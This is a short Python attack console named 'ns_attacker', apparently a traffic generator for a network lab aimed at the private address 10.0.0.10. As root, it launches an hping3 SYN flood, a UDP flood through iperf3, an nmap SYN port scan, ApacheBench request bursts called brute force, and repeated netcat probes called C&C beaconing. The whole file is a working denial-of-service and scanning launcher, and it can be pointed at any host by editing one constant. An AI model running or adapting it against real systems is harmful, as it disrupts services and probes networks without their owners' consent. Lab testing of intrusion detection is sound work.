import os
import sys
import time
import subprocess
import argparse

TARGET_IP = "10.0.0.10"

def run_attack(cmd, duration=10):
    print(f"\n[⚔️] LAUNCHING: {cmd}")
    print(f"[⏱️] Duration: {duration} seconds")
    
    try:
        # Use timeout to stop attack after duration
        subprocess.run(cmd, shell=True, timeout=duration)
    except subprocess.TimeoutExpired:
        print("[*] Attack finished.")
    except KeyboardInterrupt:
        print("[!] Attack stopped manually.")

def interactive_menu():
    print("\n--- 💀 ATTACK CONSOLE (ns_attacker) ---")
    print(f"Target: {TARGET_IP}")
    print("1. DoS: SYN Flood (hping3)")
    print("2. DoS: UDP Flood (iperf3)")
    print("3. Probe: TCP Port Scan (nmap)")
    print("4. Web: Brute Force Simulation (ab)")
    print("5. Botnet: C&C Beaconing (netcat)")
    print("0. Exit")
    return input("Select attack > ")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--attack", choices=['syn', 'udp', 'scan', 'web', 'botnet'], help="Run specific attack")
    parser.add_argument("--duration", type=int, default=10, help="Attack duration")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("Run as sudo!")
        sys.exit(1)

    if args.attack:
        # Automated mode
        if args.attack == 'syn':
            run_attack(f"hping3 -S -p 80 --flood {TARGET_IP}", duration=args.duration)
        elif args.attack == 'udp':
            run_attack(f"iperf3 -c {TARGET_IP} -u -b 100M -t {args.duration}", duration=args.duration)
        elif args.attack == 'scan':
            run_attack(f"nmap -sS -p 1-1000 {TARGET_IP}", duration=args.duration)
        elif args.attack == 'web':
            run_attack(f"ab -n 50000 -c 20 http://{TARGET_IP}/", duration=args.duration)
        elif args.attack == 'botnet':
            for _ in range(max(1, args.duration // 2)):
                subprocess.run(f"nc -z -v {TARGET_IP} 80", shell=True)
                time.sleep(2)
    else:
        # Interactive mode
        while True:
            choice = interactive_menu()
            if choice == '1': run_attack(f"hping3 -S -p 80 --flood {TARGET_IP}", duration=15)
            elif choice == '2': run_attack(f"iperf3 -c {TARGET_IP} -u -b 100M -t 10", duration=10)
            elif choice == '3': run_attack(f"nmap -sS -p 1-1000 {TARGET_IP}", duration=20)
            elif choice == '4': run_attack(f"ab -n 5000 -c 20 http://{TARGET_IP}/", duration=10)
            elif choice == '5':
                print("[*] Simulating Beaconing...")
                for _ in range(5):
                    subprocess.run(f"nc -z -v {TARGET_IP} 80", shell=True)
                    time.sleep(2)
            elif choice == '0': break
